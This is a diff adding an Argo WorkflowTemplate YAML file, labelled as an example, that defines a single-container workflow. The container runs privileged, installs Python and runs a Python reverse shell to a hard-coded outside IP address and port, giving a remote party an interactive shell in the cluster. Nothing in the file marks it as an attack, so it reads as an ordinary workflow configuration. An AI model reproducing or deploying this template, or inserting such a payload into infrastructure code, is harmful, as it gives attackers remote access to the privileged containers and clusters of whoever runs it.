@@ -1,0 +1,42 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: example-template-3fv
+  namespace: argo
+  labels:
+    example: 'true'
+spec:
+  arguments:
+    parameters:
+    - name: value1
+      value: 18.228.3.224
+    - name: value2
+      value: '4443'
+  entrypoint: example-entrypoint
+  podGC:
+    strategy: OnPodCompletion
+  templates:
+  - container:
+      args:
+      - apk add --no-cache python3 && python3 -c "import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{{inputs.parameters.value1}}',int('{{inputs.parameters.value2}}')));os.dup2(s.fileno(),0);
+        os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i']);" && tail -f /dev/null
+      command:
+      - sh
+      - -c
+      image: alpine:latest
+      name: main
+      resources: {}
+      securityContext:
+        privileged: true
+    inputs:
+      parameters:
+      - name: value1
+      - name: value2
+    metadata: {}
+    name: example-entrypoint
+    outputs: {}
+  ttlStrategy:
+    secondsAfterCompletion: 300
+  workflowMetadata:
+    labels:
+      example: 'true'
